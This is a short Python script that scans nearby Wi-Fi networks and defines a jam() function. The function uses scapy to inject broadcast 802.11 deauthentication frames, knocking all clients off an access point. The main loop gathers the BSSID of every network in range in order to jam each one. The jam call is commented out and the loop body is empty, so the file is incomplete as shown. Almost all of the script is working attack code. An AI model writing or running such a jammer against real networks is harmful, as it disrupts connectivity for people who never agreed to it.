#!/usr/bin/python

import wireless
from wifi import Cell # get all the networks
from scapy.all import *

'''
    RadioTap BlogPost: http://wifinigel.blogspot.com/2013/11/what-are-radiotap-headers.html

'''

def jam(address): # addresses to jam

    conf.iface = "wlp3s0"
    bssid = address
    client = "FF:FF:FF:FF:FF:FF" # broadcasting MAC to all the clients - disconnecting from the network
    count = 3 # sending the Deauth packet
    conf.verb = 0 # for scapy

    # generating a packet (RadioTap injection on the  802.11 header)
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    for n in range(int(count)):
        sendp(packet) # sending generated packet
        print("DeAuth Num: %s Sent via: %s to BSSID: %s for Client: %s" % (str(n), conf.iface, bssid, client))


if __name__ == "__main__":
    # Wireless object
    wifi1 = wireless.Wireless()
    # selecting interface
    iface = wifi1.interface()
    print(iface)

    # getting all network informations
    all_networks = Cell.all(iface)
    # adding address (future)
    bssids = []

    # displaying information
    for wifi in all_networks:
        print("Network name (Ssid): %s" % wifi.ssid)
        print("Network address (Bssid): %s" % wifi.address)
        print("Network channel: %s" % str(wifi.channel))
        print("Network quality: %s" % str(wifi.quality))
        # appending address to list
        bssids.append(wifi.address)

    # jamming process
    while True:
        for bssid in bssids:
            #print("Jamming on %s" % bssid)
            #jam(bssid)
